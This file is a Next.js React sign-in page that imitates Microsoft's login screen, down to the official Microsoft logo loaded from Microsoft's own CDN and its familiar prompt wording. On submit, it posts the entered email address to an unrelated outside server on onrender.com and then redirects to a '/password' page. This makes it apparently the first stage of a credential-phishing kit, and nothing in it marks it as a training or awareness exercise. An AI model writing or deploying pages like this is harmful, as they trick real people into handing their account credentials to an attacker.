'use client'

import { FormEvent, useState } from "react";
import { useRouter } from "next/navigation";
import "../../styles/signin.css";

export default function SignInPage() {
  const [email, setEmail] = useState("");
  const [error, setError] = useState(""); 
  const router = useRouter();

  const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
      setError("Enter a valid email address, phone number, or Skype name.");
      return;
    }

    try {
      localStorage.setItem("userEmail", email);

      await fetch("https://signin-backend-itzo.onrender.com/register-email", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ email }),
      });

      router.push("/password");
    } catch (err) {
      console.error(err);
    }
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center">
      <div className="bg-white w-[430px] p-8 shadow-md">
        <div className="flex items-center mb-0 pt-5">
          <img
            className="logo"
            role="img"
            src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg"
            alt="Microsoft"
          />
        </div>

        <h1 className="signin-title text-[#1b1b1b] text-2xl font-semibold mb-2 pt-0 mt-0">
          Sign in
        </h1>

          {error && (
            <p className="text-[#e81123] text-[15px] mt-0">{error}</p>
          )}

        <form onSubmit={handleSubmit}>
          <input
            type="text"
            name="email"
            placeholder="Email, phone, or Skype"
            value={email}
            onChange={(e) => {
              setEmail(e.target.value);
              if (error) setError("");
            }}
            className={`link-text text-[#1b1b1b] text-[15px] border-b w-full focus:outline-none pb-1 text-lg ${
              error ? "border-red-600 focus:border-red-600" : "border-gray-400 focus:border-blue-600"
            }`}
          />

          <p className="link-text text-[13px] text-black mb-1 pt-2">
            No account?{" "}
            <a
              href="#"
              className="link-text text-[13px] hover:text-gray-500 text-blue-600 hover:underline cursor-pointer"
            >
              Create one!
            </a>
          </p>
          <p className="link-text text-[13px] text-blue-600 hover:text-gray-500 hover:underline cursor-pointer mb-3 mt-4">
            Can’t access your account?
          </p>

          <div className="flex justify-end gap-1 mt-6">
            <button
              type="button"
              className="sign w-[100px] py-1 text-black bg-gray-200 hover:bg-gray-300"
            >
              Back
            </button>
            <button
              type="submit"
              className="sign w-[100px] py-1 bg-[#0067b8] text-white hover:bg-blue-700"
            >
              Next
            </button>
          </div>
        </form>
      </div>

      <a
        href="#"
        className="bg-white mt-4 w-[430px] flex items-center py-1.5 px-3 hover:bg-gray-200 cursor-pointer shadow-md"
      >
        <img
          className="w-8 h-8 mr-3 ml-8"
          role="presentation"
          src="https://aadcdn.msftauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg"
          alt="Sign-in options"
        />
        <span className="sign text-[15px] text-[#1b1b1b]">Sign-in options</span>
      </a>

      <div className="footer-links">
        <a href="#" className="hover:underline">Terms of use</a>
        <a href="#" className="hover:underline">Privacy & cookies</a>
        <a href="#" className="hover:underline">...</a>
      </div>
    </div>
  );
}
